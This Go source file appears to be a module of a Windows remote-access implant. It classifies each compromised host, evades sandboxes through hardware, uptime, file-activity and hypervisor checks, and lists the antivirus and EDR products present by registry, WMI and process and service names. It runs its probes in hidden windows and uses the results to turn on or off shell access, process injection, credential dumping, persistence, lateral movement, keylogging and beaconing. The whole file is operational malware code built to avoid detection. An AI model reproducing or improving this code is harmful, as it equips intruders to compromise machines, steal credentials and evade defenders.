//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var defaultProfiles = map[EnvClass]OpsProfile{
	EnvSandbox: {
		Class: EnvSandbox, ClassLabel: "sandbox",
		AllowShell: false, AllowInjection: false, AllowCredDump: false,
		AllowPersistence: false, AllowLateral: false, AllowKeylogger: false,
		AllowScreenCapture: false, AllowTokenOps: false,
		MaxBeaconJitter: 10, MinBeaconInterval: 600,
		OfficeHoursOnly: false,
	},
	EnvHome: {
		Class: EnvHome, ClassLabel: "home",
		AllowShell: true, AllowInjection: true, AllowCredDump: true,
		AllowPersistence: true, AllowLateral: true, AllowKeylogger: true,
		AllowScreenCapture: true, AllowTokenOps: true,
		MaxBeaconJitter: 30, MinBeaconInterval: 30,
		OfficeHoursOnly: false,
	},
	EnvCorporate: {
		Class: EnvCorporate, ClassLabel: "corporate",
		AllowShell: true, AllowInjection: true, AllowCredDump: true,
		AllowPersistence: false, AllowLateral: true, AllowKeylogger: false,
		// A domain-joined workstation is not automatically a protected server
		// or an EDR-managed endpoint. Allow operator-requested capture here;
		// classify() disables it again whenever EDR is detected.
		AllowScreenCapture: true, AllowTokenOps: true,
		MaxBeaconJitter: 20, MinBeaconInterval: 60,
		OfficeHoursOnly: true,
	},
	EnvServer: {
		Class: EnvServer, ClassLabel: "server",
		AllowShell: true, AllowInjection: true, AllowCredDump: true,
		AllowPersistence: true, AllowLateral: true, AllowKeylogger: false,
		AllowScreenCapture: false, AllowTokenOps: true,
		MaxBeaconJitter: 15, MinBeaconInterval: 120,
		OfficeHoursOnly: false,
	},
	EnvHighValue: {
		Class: EnvHighValue, ClassLabel: "high_value",
		AllowShell: true, AllowInjection: false, AllowCredDump: true,
		AllowPersistence: false, AllowLateral: true, AllowKeylogger: false,
		AllowScreenCapture: false, AllowTokenOps: true,
		MaxBeaconJitter: 25, MinBeaconInterval: 180,
		OfficeHoursOnly: true,
	},
}

// EnvironmentDetector performs deep environment analysis
type EnvironmentDetector struct {
	mu        sync.Mutex
	profile   *OpsProfile
	analyzed  bool
	lastCheck time.Time
	checkInt  time.Duration

	domainSid      string
	isDomainJoined bool
	domainName     string
	edrProducts    []string
	avProducts     []string
	totalRAM       uint64
	cpuCores       int
	osVersion      string
	isServer       bool
	users          int
	services       int
	isDC           bool
	isExch         bool
	isSQL          bool
	isHypervisor   bool
	// Test stubs: when stubEnv is true, isLikelySandbox uses these instead
	// of live probes (uptime, recent files, hypervisor), making classify()
	// hermetic under test on any host.
	stubEnv         bool
	stubUptimeMin   int64
	stubRecentFiles int
	stubHypervisor  bool
}

func NewEnvironmentDetector() *EnvironmentDetector {
	return &EnvironmentDetector{
		checkInt: 5 * time.Minute,
	}
}

func (ed *EnvironmentDetector) Analyze() *OpsProfile {
	ed.mu.Lock()
	defer ed.mu.Unlock()

	if ed.analyzed && time.Since(ed.lastCheck) < ed.checkInt {
		return ed.profile
	}
	ed.analyzed = true
	ed.lastCheck = time.Now()
	ed.collectSystemInfo()
	ed.detectSecurityProducts()
	ed.classify()
	return ed.profile
}

func (ed *EnvironmentDetector) ForceReanalyze() *OpsProfile {
	// Reset under the lock, then run Analyze unlocked: Analyze takes the
	// same non-reentrant mutex, so holding it here would self-deadlock.
	ed.mu.Lock()
	ed.analyzed = false
	ed.lastCheck = time.Time{}
	ed.mu.Unlock()
	return ed.Analyze()
}

func (ed *EnvironmentDetector) Profile() *OpsProfile {
	ed.mu.Lock()
	defer ed.mu.Unlock()
	if ed.profile == nil {
		p := defaultProfiles[EnvUnknown]
		ed.profile = &p
	}
	return ed.profile
}

func (ed *EnvironmentDetector) collectSystemInfo() {
	ed.cpuCores = runtime.NumCPU()

	mem, err := ed.getTotalRAM()
	if err == nil {
		ed.totalRAM = mem
	}

	ed.osVersion = ed.getOSVersion()

	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.READ)
	if err == nil {
		installType, _, _ := k.GetStringValue("InstallationType")
		k.Close()
		ed.isServer = strings.Contains(strings.ToLower(installType), "server")
	}

	ed.isDomainJoined = ed.checkDomainJoin()
	if ed.isDomainJoined {
		ed.domainName = os.Getenv("USERDOMAIN")
	}

	ed.users = ed.countUsers()
	ed.services = ed.countServices()
	ed.isDC = ed.checkDomainController()
	ed.isExch = ed.checkExchange()
	ed.isSQL = ed.checkSQLServer()
	ed.isHypervisor = ed.checkHypervisor()
}

func (ed *EnvironmentDetector) detectSecurityProducts() {
	avList := ed.detectAV()
	edrList := ed.detectEDR()

	for _, p := range avList {
		found := false
		for _, e := range ed.avProducts {
			if e == p {
				found = true
				break
			}
		}
		if !found {
			ed.avProducts = append(ed.avProducts, p)
		}
	}
	for _, p := range edrList {
		found := false
		for _, e := range ed.edrProducts {
			if e == p {
				found = true
				break
			}
		}
		if !found {
			ed.edrProducts = append(ed.edrProducts, p)
		}
	}
}

func (ed *EnvironmentDetector) classify() {
	// Check sandbox first
	if inSandbox || ed.isLikelySandbox() {
		p := defaultProfiles[EnvSandbox]
		ed.profile = &p
		return
	}

	// Determine environment class
	class := EnvHome

	// High-value is for actual DC/Exchange/SQL *servers*, not a workstation
	// that can see a DC (nltest) or has SSMS/LocalDB registry keys.
	if ed.isServer && (ed.isDC || ed.isExch || ed.isSQL) {
		class = EnvHighValue
	} else if ed.isServer && ed.domainName != "" {
		class = EnvServer
	} else if ed.isDomainJoined && (len(ed.edrProducts) > 0 || len(ed.avProducts) > 0) {
		class = EnvCorporate
	} else if ed.users > 10 || ed.services > 200 {
		class = EnvCorporate
	} else if ed.isDomainJoined {
		class = EnvCorporate
	}

	p := adjustedOpsProfile(class, len(ed.edrProducts) > 0)
	ed.profile = &p
}

func adjustedOpsProfile(class EnvClass, hasEDR bool) OpsProfile {
	p := defaultProfiles[class]
	if hasEDR {
		// Corporate workstations with EDR: keep operator triage capabilities
		// (shell/screen) enabled; only high-value/server get full lockdown.
		if class == EnvHighValue || class == EnvServer {
			p.AllowInjection = false
			p.AllowKeylogger = false
			p.AllowScreenCapture = false
		}
		if p.MinBeaconInterval < 120 {
			p.MinBeaconInterval = 120
		}
		p.MaxBeaconJitter = 15
	}

	// High-value: keep injection/persistence quiet, but interactive shell is
	// the operator's primary control channel and must stay enabled.
	if class == EnvHighValue {
		p.AllowPersistence = false
		p.AllowInjection = false
	}
	return p
}

func (ed *EnvironmentDetector) isLikelySandbox() bool {
	if ed.cpuCores < 2 || ed.totalRAM < 4*1024*1024*1024 {
		return true
	}
	uptime := ed.getUptimeMinutes()
	recentFiles := ed.countRecentFiles()
	hypervisor := ed.isHypervisor
	if ed.stubEnv {
		uptime, recentFiles, hypervisor = ed.stubUptimeMin, ed.stubRecentFiles, ed.stubHypervisor
	}
	if uptime < 10 {
		return true
	}
	if recentFiles < 2 {
		return true
	}
	if hypervisor && ed.users <= 1 && !ed.isDomainJoined {
		return true
	}
	return false
}

func (ed *EnvironmentDetector) getTotalRAM() (uint64, error) {
	mod := windows.NewLazySystemDLL("kernel32.dll")
	proc := mod.NewProc("GetPhysicallyInstalledSystemMemory")
	var memKB uint64
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&memKB)))
	if ret == 0 {
		return 0, fmt.Errorf("GetPhysicallyInstalledSystemMemory failed")
	}
	return memKB * 1024, nil
}

func (ed *EnvironmentDetector) getOSVersion() string {
	mod := windows.NewLazySystemDLL("ntdll.dll")
	proc := mod.NewProc("RtlGetVersion")
	type osVersionInfoEx struct {
		OSVersionInfoSize uint32
		MajorVersion      uint32
		MinorVersion      uint32
		BuildNumber       uint32
		PlatformID        uint32
		CSDVersion        [128]uint16
		ServicePackMajor  uint16
		ServicePackMinor  uint16
		SuiteMask         uint16
		ProductType       byte
		Reserved          byte
	}
	info := &osVersionInfoEx{}
	info.OSVersionInfoSize = uint32(unsafe.Sizeof(*info))
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(info)))
	if ret != 0 {
		return "unknown"
	}
	return fmt.Sprintf("%d.%d.%d", info.MajorVersion, info.MinorVersion, info.BuildNumber)
}

func (ed *EnvironmentDetector) getUptimeMinutes() int64 {
	mod := windows.NewLazySystemDLL("kernel32.dll")
	proc := mod.NewProc("GetTickCount64")
	ret, _, _ := proc.Call()
	return int64(ret / 60000)
}

func (ed *EnvironmentDetector) checkDomainJoin() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`, registry.READ)
	if err != nil {
		return false
	}
	defer k.Close()
	domain, _, err := k.GetStringValue("Domain")
	if err != nil || domain == "" {
		return false
	}
	return strings.ToLower(domain) != "workgroup"
}

func (ed *EnvironmentDetector) countUsers() int {
	cmd := exec.Command("cmd", "/c", "dir", `C:\Users`, "/b")
	applyHideWindow(cmd)
	out, err := cmd.Output()
	if err != nil {
		return 0
	}
	lines := strings.Split(strings.TrimSpace(string(out)), "\n")
	count := 0
	for _, l := range lines {
		l = strings.TrimSpace(l)
		if l != "" && !strings.HasPrefix(l, "$") && !strings.EqualFold(l, "Public") && !strings.EqualFold(l, "Default") && !strings.EqualFold(l, "Default User") && !strings.EqualFold(l, "All Users") {
			count++
		}
	}
	return count
}

func (ed *EnvironmentDetector) countServices() int {
	cmd := exec.Command("cmd", "/c", "sc", "query", "type=", "service", "state=", "all")
	applyHideWindow(cmd)
	out, err := cmd.Output()
	if err != nil {
		return 0
	}
	count := 0
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "SERVICE_NAME") {
			count++
		}
	}
	return count
}

func (ed *EnvironmentDetector) checkDomainController() bool {
	// NTDS exists only on a DC. nltest /DSGETDC succeeds on every domain-joined
	// workstation and must not promote the host to high_value.
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\NTDS`, registry.READ)
	if err == nil {
		k.Close()
		return true
	}
	return false
}

func (ed *EnvironmentDetector) checkExchange() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\ExchangeServer`, registry.READ)
	if err == nil {
		k.Close()
		return true
	}
	return false
}

func (ed *EnvironmentDetector) checkSQLServer() bool {
	// SSMS / client tools write SOFTWARE\Microsoft\Microsoft SQL Server.
	// Instance Names\SQL is present only when a database engine is installed.
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL`, registry.READ)
	if err == nil {
		k.Close()
		return true
	}
	return false
}

func (ed *EnvironmentDetector) checkHypervisor() bool {
	cmd := exec.Command("cmd", "/c", "systeminfo")
	applyHideWindow(cmd)
	out, err := cmd.Output()
	if err != nil {
		return false
	}
	output := strings.ToLower(string(out))
	indicators := []string{"hyper-v", "vmware", "virtualbox", "xen", "parallels", "virtual machine", "kvm"}
	for _, ind := range indicators {
		if strings.Contains(output, ind) {
			return true
		}
	}
	// Check CPU hypervisor bit
	mod := windows.NewLazySystemDLL("kernel32.dll")
	proc := mod.NewProc("IsProcessorFeaturePresent")
	ret, _, _ := proc.Call(0x4000000) // PF_HYPERVISOR_BIT
	return ret != 0
}

func (ed *EnvironmentDetector) detectAV() []string {
	var found []string
	avPaths := []string{
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`,
		`SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall`,
	}
	avNames := []string{
		"windows defender", "microsoft defender", "mcafee", "norton", "symantec",
		"kaspersky", "eset", "bitdefender", "avast", "avg", "avira",
		"trend micro", "sophos", "palo alto", "crowdstrike", "carbon black",
		"sentinelone", "cylance", "malwarebytes", "comodo", "f-secure",
		"fortinet", "check point", "webroot", "panda", "360",
		"huorong", "tencent", "qihoo",
	}
	for _, path := range avPaths {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.READ)
		if err != nil {
			continue
		}
		keys, err := k.ReadSubKeyNames(-1)
		k.Close()
		if err != nil {
			continue
		}
		for _, subKey := range keys {
			sk, err := registry.OpenKey(registry.LOCAL_MACHINE, path+`\`+subKey, registry.READ)
			if err != nil {
				continue
			}
			displayName, _, err := sk.GetStringValue("DisplayName")
			sk.Close()
			if err != nil || displayName == "" {
				continue
			}
			lower := strings.ToLower(displayName)
			for _, av := range avNames {
				if strings.Contains(lower, av) {
					found = append(found, displayName)
					break
				}
			}
		}
	}

	// Check WMI for antivirus products
	wmiCmd := exec.Command("cmd", "/c", "wmic", "/namespace:\\\\root\\securitycenter2", "path", "AntivirusProduct", "get", "displayName", "/format:csv")
	applyHideWindow(wmiCmd)
	out, err := wmiCmd.Output()
	if err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			parts := strings.Split(line, ",")
			if len(parts) >= 2 {
				name := strings.TrimSpace(parts[len(parts)-1])
				if name != "" && !strings.Contains(strings.ToLower(name), "displayname") {
					dup := false
					for _, f := range found {
						if strings.EqualFold(f, name) {
							dup = true
							break
						}
					}
					if !dup {
						found = append(found, name)
					}
				}
			}
		}
	}
	return found
}

func (ed *EnvironmentDetector) detectEDR() []string {
	var found []string

	edrProcs := map[string]string{
		"cisvc.exe":                "Carbon Black",
		"parity.exe":               "Carbon Black",
		"repMgr.exe":               "Carbon Black",
		"cbserver.exe":             "Carbon Black",
		"cb.exe":                   "Carbon Black",
		"csfalcon.exe":             "CrowdStrike Falcon",
		"csagent.exe":              "CrowdStrike Falcon",
		"csscan.exe":               "CrowdStrike Falcon",
		"hmpalert.exe":             "Cylance",
		"cyalert.exe":              "Cylance",
		"sentinelagent.exe":        "SentinelOne",
		"sentinelctl.exe":          "SentinelOne",
		"sentinelstaticengine.exe": "SentinelOne",
		"s1_ui.exe":                "SentinelOne",
		"threatstack-agent":        "ThreatStack",
		"falcon-sensor":            "CrowdStrike",
		"falconctl":                "CrowdStrike",
		"osqueryd.exe":             "Osquery",
		"osqueryi.exe":             "Osquery",
		"xagt.exe":                 "FireEye",
		"xagtnotif.exe":            "FireEye",
		"dwagent.exe":              "FireEye",
		"edr_sensor.exe":           "Trend Micro Apex One",
		"edrm_agent.exe":           "Trend Micro Apex One",
		"nessusd.exe":              "Tenable",
		"nessusagent.exe":          "Tenable",
		"secedo.exe":               "Palo Alto Cortex XDR",
		"cybereason.exe":           "Cybereason",
		"elastic-endpoint.exe":     "Elastic EDR",
		"winlogbeat.exe":           "Elastic",
		"filebeat.exe":             "Elastic",
		"auditbeat.exe":            "Elastic",
		"beats-agent.exe":          "Elastic",
		"wazuh-agent.exe":          "Wazuh",
		"ossec-agent.exe":          "OSSEC/Wazuh",
		"sysmon.exe":               "Sysmon",
		"sysmon64.exe":             "Sysmon",
	}

	tlCmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
	applyHideWindow(tlCmd)
	out, err := tlCmd.Output()
	if err == nil {
		output := strings.ToLower(string(out))
		for proc, name := range edrProcs {
			if strings.Contains(output, strings.ToLower(proc)) {
				dup := false
				for _, f := range found {
					if f == name {
						dup = true
						break
					}
				}
				if !dup {
					found = append(found, name)
				}
			}
		}
	}

	edrServices := []string{
		"Sense",           // Microsoft Defender for Endpoint
		"AtcService",      // Bitdefender EDR
		"Atc",             // Bitdefender
		"CybereasonSvc",   // Cybereason
		"CbDefense",       // Carbon Black
		"CSFalconService", // CrowdStrike
		"ElasticAgentSvc", // Elastic
		"FireEyeService",  // FireEye
		"TMAgentService",  // Trend Micro
		"S1AgentSvc",      // SentinelOne
		"PaloAltoEDR",     // Cortex XDR
		"CylanceSvc",      // Cylance
		"McAfeeEDR",       // McAfee
		"SymantecEDR",     // Symantec
	}

	svcCmd := exec.Command("cmd", "/c", "sc", "query", "type=", "service", "state=", "all")
	applyHideWindow(svcCmd)
	out2, err := svcCmd.Output()
	if err == nil {
		output := strings.ToLower(string(out2))
		for _, svc := range edrServices {
			if strings.Contains(output, strings.ToLower(svc)) {
				dup := false
				for _, f := range found {
					if f == svc {
						dup = true
						break
					}
				}
				if !dup {
					found = append(found, svc)
				}
			}
		}
	}

	return found
}

func (ed *EnvironmentDetector) countRecentFiles() int {
	dirs := []string{
		os.Getenv("USERPROFILE") + "\\Documents",
		os.Getenv("USERPROFILE") + "\\Desktop",
		os.Getenv("USERPROFILE") + "\\Downloads",
	}
	threshold := time.Now().Add(-24 * time.Hour)
	count := 0
	for _, dir := range dirs {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			continue
		}
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, entry := range entries {
			info, err := entry.Info()
			if err != nil {
				continue
			}
			if info.ModTime().After(threshold) {
				count++
			}
		}
	}
	return count
}

// EnvSummary generates a compact JSON-like summary for beacon info
func (ed *EnvironmentDetector) EnvSummary() map[string]string {
	p := ed.Analyze()
	summary := make(map[string]string)
	summary["env_class"] = p.ClassLabel
	summary["env_score"] = fmt.Sprintf("%d", p.Class)
	summary["domain"] = ed.domainName
	summary["is_dc"] = fmt.Sprintf("%t", ed.isDC)
	summary["is_server"] = fmt.Sprintf("%t", ed.isServer)
	summary["os_ver"] = ed.osVersion
	summary["users"] = fmt.Sprintf("%d", ed.users)
	summary["edr_count"] = fmt.Sprintf("%d", len(ed.edrProducts))
	return summary
}

// Global environment detector instance
var envDetector *EnvironmentDetector
var envDetectorMu sync.Once

func getEnvDetector() *EnvironmentDetector {
	envDetectorMu.Do(func() {
		envDetector = NewEnvironmentDetector()
		profile := envDetector.Analyze()
		logDebugf("Environment classified as: %s", profile.ClassLabel)
	})
	return envDetector
}

func detectEnvironment() (string, *OpsProfile) {
	d := getEnvDetector()
	p := d.Profile()
	return p.ClassLabel, p
}
